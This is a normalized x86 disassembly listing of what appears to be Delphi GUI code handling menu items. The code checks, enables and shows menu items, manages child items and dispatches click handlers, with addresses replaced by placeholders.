mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c40
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4040a0
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_4520c0
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404314
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454815
lea eax [ ebp - 0x24 ]
call sub_404008
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_452ffc
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_454840
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404414
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40405c
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_454868
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4549d8
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_4549e8
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_4548b0
sub_4548b0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_452f6c
push eax
call CheckMenuItem
mov eax esi
call sub_454868
sub_454904
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_4549d8
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_452f6c
push eax
call EnableMenuItem
sub_45497c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_454d3c
mov edx eax
mov ecx ebx
mov eax edi
call sub_452f0c
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_454868
sub_4549e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a468
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_452014
sub_454a58
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4549d8
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_454a40
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_454d70
mov ecx ebx
mov edx esi
mov eax edi
call sub_454b64
sub_454aa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4549d8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4549e8
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_454af8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_4549d8
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_4549e8
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_4549e8
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_454b64
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_452014
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_452f0c
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_41a4e4
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_454ddc
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_4549d8
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_452e3c
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_41a468
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_41a468
mov dl [ eax + 0x3f ]
mov eax esi
call sub_45497c
sub_454c18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_452014
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_4549d8
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_452e3c
mov eax ebx
call sub_4549d8
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a468
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a358
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_454c8c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_4548b0
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4549c0
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_4549c0
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_454d54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4549d8
mov edx eax
mov ecx esi
mov eax ebx
call sub_454b64
pop esi
pop ebx
retn
sub_454d70
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_454d3c
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_454c18
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_452014
sub_454d98
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_454ddc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_454ddc
jmp r-xdata
mov eax ebx
call sub_452e3c
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_456ab4
sub_454e34
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebx + 0x4c ] eax
sub_454e5c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403234
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4550f0
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403430
mov edx ebx
mov eax edi
call sub_4207e4
mov eax ebx
mov si 0xffee
call sub_403430
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_454ecc
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ esi + 0x4c ] eax
sub_454f00
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4549d8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4549e8
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_454f40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_454d70
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_454d54
jmp r-xdata
mov edx ebx
mov eax esi
call sub_454d54
sub_454fa4
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_454868
sub_454fd0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_454840
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_4548b0
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_454904
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_40405c
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_454a30
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_45497c
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_454a0c
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_454a20
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_4550f0
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4549c0
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403430
sub_455114
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_455134
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_455154
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_455174
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_455194
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4551b4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4551d4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4551f4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_455214
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_455234
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41ab48
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44f53c
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44f674
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44f6d4
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44f3d4
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_44f794
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4552ac
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420a30
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4549c0
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_454e5c
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_455300
jmp r-xdata
xor edx edx
mov eax esi
call sub_452dc4
sub_455300
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_450798
mov eax ebx
call sub_455370
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_4507dc
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_4207e4
sub_455348
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_455348
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_452498
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_454ddc
mov eax ebx
pop esi
pop ebx
retn
sub_455384
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c6e8
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404568
sub_4553b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4040a0
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_455438
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45555a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4042c8
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4042c8
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404528
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404414
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455561
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4045b0
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404388
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4042c8
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404528
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404388
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_455598
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_455a37
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4040a0
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4559f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4549d8
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_4040a0
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455a3e
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_40402c
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_40402c
lea eax [ ebp - 0x18 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
call sub_455bec
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4549e8
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404414
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4553b4
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4549e8
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4549e8
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403234
mov eax [ ebp - 0x20 ]
call sub_403234
mov eax [ ebp - 0x14 ]
call sub_403234
mov eax [ ebp - 0xc ]
call sub_403234
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_4553b4
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4042c8
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4549e8
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_457538
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407ff4
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_40405c
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c6e8
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
